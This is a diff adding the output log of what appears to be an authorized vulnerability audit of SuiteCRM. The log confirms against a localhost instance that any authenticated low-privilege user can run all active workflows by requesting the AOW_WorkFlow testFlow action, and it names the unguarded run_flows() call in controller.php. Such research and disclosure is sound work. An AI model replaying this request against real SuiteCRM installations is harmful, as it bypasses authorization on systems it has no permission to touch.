@@ -1,0 +1,13 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-026/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-026/../.venv
+========================================================================
+VULN-026: AOW_WorkFlow testFlow -> run_flows() runnable by any user (BFLA)
+target: http://localhost:33116
+========================================================================
+[INFO] sink: modules/AOW_WorkFlow/controller.php:639 run_flows() with no is_admin/ACL gate
+[SETUP] admin creates a disposable low-privilege user (is_admin=0)
+[SETUP] authenticated as low-priv user mod_1f642788
+[STEP] GET module=AOW_WorkFlow&action=testFlow as the low-priv user -> should run ALL active workflows
+[PROOF] response begins: 'Started<br />PASSED<!DOCTYPE html>\n<html'  (Started=True, PASSED=True, access-denied=False)
+[OK] exploit confirmed — a non-admin invoked run_flows(); the scheduler workflow-execution routine ran (to completion (PASSED)) with no authorization
+==> VULN-026: CONFIRMED — any authenticated user runs all active workflows via testFlow -> run_flows() (BFLA)
